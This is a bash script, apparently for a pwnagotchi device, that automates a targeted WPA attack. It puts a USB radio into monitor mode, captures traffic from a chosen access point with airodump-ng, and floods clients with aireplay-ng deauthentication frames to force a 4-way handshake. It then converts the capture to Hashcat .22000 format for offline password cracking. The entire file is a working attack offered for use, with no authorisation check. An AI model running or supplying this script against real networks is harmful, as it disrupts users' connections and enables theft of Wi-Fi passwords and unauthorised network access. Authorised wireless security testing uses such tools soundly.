#!/bin/bash
# ACID Handshake Hunter - dedicated targeted WPA handshake + PMKID capture.
# Pauses pwnagotchi, puts the ACM (MT7612U) monitor on the target channel, runs
# airodump-ng capture + aireplay-ng deauth to force the 4-way handshake, then converts
# the capture to Hashcat .22000 and verifies. Restores pwnagotchi when done.
# Usage:  acid-handshake.sh <BSSID> <channel> [label]
# Result written live to /tmp/acid_hs_result ; capture saved in /home/pi/handshakes/
export PATH="/usr/sbin:/usr/bin:/sbin:/bin:$PATH"
BSSID="$(echo "$1" | tr 'A-Z' 'a-z')"
CH="$2"
LABEL="$(echo "${3:-target}" | tr -c 'A-Za-z0-9' '_')"
DUR=26
HDIR=/home/pi/handshakes
OUTBASE="$HDIR/hunt_${LABEL}_$(echo "$BSSID" | tr -d ':')"
echo "starting" > /tmp/acid_hs_result
if [ -z "$BSSID" ] || [ -z "$CH" ]; then echo "FAIL: need bssid + channel" > /tmp/acid_hs_result; exit 1; fi
echo "[hs] target=$BSSID ch=$CH label=$LABEL"

# locate ACM (monitor radio) by USB-id
ACM=""
for w in $(ls /sys/class/net | grep '^wlan'); do
  dd=$(readlink -f /sys/class/net/$w/device 2>/dev/null)
  while [ -n "$dd" ] && [ "$dd" != "/" ]; do
    if [ -f "$dd/idVendor" ]; then [ "$(cat $dd/idVendor):$(cat $dd/idProduct)" = "0e8d:7612" ] && ACM=$w; break; fi
    dd=$(dirname "$dd"); done
done
if [ -z "$ACM" ]; then echo "FAIL: ACM (0e8d:7612) not found" > /tmp/acid_hs_result; exit 1; fi

systemctl stop pwnagotchi 2>/dev/null; sleep 3
pkill -f airodump-ng 2>/dev/null; pkill -f aireplay 2>/dev/null
iw dev hsmon del 2>/dev/null; iw dev wlan0mon del 2>/dev/null
APHY=$(cat /sys/class/net/$ACM/phy80211/name 2>/dev/null)
iw phy "$APHY" interface add hsmon type monitor 2>/dev/null
ip link set "$ACM" down 2>/dev/null; ip link set hsmon up 2>/dev/null
iw dev hsmon set channel "$CH" 2>/dev/null

rm -f "${OUTBASE}-01.cap"
echo "capturing on ch$CH..." > /tmp/acid_hs_result
setsid airodump-ng -c "$CH" --bssid "$BSSID" -w "$OUTBASE" --output-format pcap hsmon >/tmp/acid_hs_airodump.log 2>&1 &
ADPID=$!
sleep 2
END=$(( $(date +%s) + DUR ))
while [ "$(date +%s)" -lt "$END" ]; do
  aireplay-ng --deauth 6 -a "$BSSID" hsmon >/dev/null 2>&1
  sleep 4
done
kill $ADPID 2>/dev/null; pkill -f airodump-ng 2>/dev/null
sleep 1

CAP="${OUTBASE}-01.cap"
GOT=0; KIND=""; HAS22=0
if [ -f "$CAP" ]; then
  OUT22="${OUTBASE}.22000"
  hcxpcapngtool -o "$OUT22" "$CAP" >/tmp/acid_hs_hcx.log 2>&1
  if [ -s "$OUT22" ]; then
    GOT=1; HAS22=1
    grep -qiE "PMKID.*written|WPA\*01" /tmp/acid_hs_hcx.log && KIND="PMKID"
    grep -qiE "EAPOL.*written|WPA\*02" /tmp/acid_hs_hcx.log && KIND="${KIND:+$KIND+}handshake"
  fi
  if [ "$HAS22" = 0 ]; then
    aircrack-ng "$CAP" 2>/dev/null | grep -qiE "1 handshake|WPA \(1 handshake" && GOT=1
  fi
fi

iw dev hsmon del 2>/dev/null
ip link set "$ACM" down 2>/dev/null
systemctl start pwnagotchi 2>/dev/null

if [ "$GOT" = 1 ] && [ "$HAS22" = 1 ]; then
  echo "GOT ${KIND:-handshake}: ${OUTBASE##*/}.22000" > /tmp/acid_hs_result
elif [ "$GOT" = 1 ]; then
  echo "GOT handshake (.cap saved, convert manually)" > /tmp/acid_hs_result
else
  echo "no capture - need an ACTIVE client on the AP, retry" > /tmp/acid_hs_result
fi
echo "[hs] done GOT=$GOT kind=$KIND"
